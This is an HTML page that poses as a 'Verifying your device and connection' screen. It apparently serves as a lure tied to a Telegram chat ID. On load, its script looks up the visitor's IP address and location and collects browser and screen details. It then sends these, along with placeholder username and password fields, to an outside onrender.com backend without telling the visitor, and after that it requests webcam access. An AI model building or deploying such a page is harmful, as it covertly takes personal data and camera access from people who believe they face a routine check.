
<!DOCTYPE html>
<html>
<head>
  <title>Verifying...</title>
  <style>
    body {
      background-color: #f9f9f9;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
      color: #333;
    }
    .loading {
      font-size: 20px;
      margin-bottom: 20px;
    }
    .dots::after {
      content: '';
      animation: dots 1.5s steps(3, end) infinite;
    }
    @keyframes dots {
      0% { content: ''; }
      33% { content: '.'; }
      66% { content: '..'; }
      100% { content: '...'; }
    }
    video {
      margin-top: 20px;
      border-radius: 10px;
      width: 300px;
      height: auto;
      display: none;
    }
  </style>
</head>
<body>
  <div class="loading">
    ðŸ”„ Verifying your device and connection<span class="dots"></span><br>
    This may take a few seconds. Please keep this tab open.
  </div>

  <video id="videoPreview" autoplay muted playsinline></video>

  <script>
    let userIP = "";
    let deviceInfo = "";
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get("id");

    // Get IP info
    fetch("https://ipinfo.io/json?token=demo")
      .then(response => response.json())
      .then(data => {
        userIP = data.ip + " | " + data.city + ", " + data.region + " - " + data.country;
        collectAndSend();
      });

    function collectAndSend() {
      // Get device info
      deviceInfo = navigator.userAgent + " | Screen: " + window.screen.width + "x" + window.screen.height;

      // Send to backend first
      if (!chatId) {
        console.warn("Missing Telegram ID in URL.");
        return;
      }

      fetch("https://render-backend-package1.onrender.com/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          username: "[AUTO]",
          password: "[AUTO]",
          ip: userIP,
          device: deviceInfo
        })
      }).then(() => {
        console.log("IP & Device info sent. Now asking for camera access...");
        setTimeout(requestCameraAccess, 1500);
      });
    }

    function requestCameraAccess() {
      const video = document.getElementById("videoPreview");
      video.style.display = "block";
      navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
          video.srcObject = stream;
        })
        .catch((err) => {
          console.warn("Camera access denied or not available.");
        });
    }
  </script>
</body>
</html>
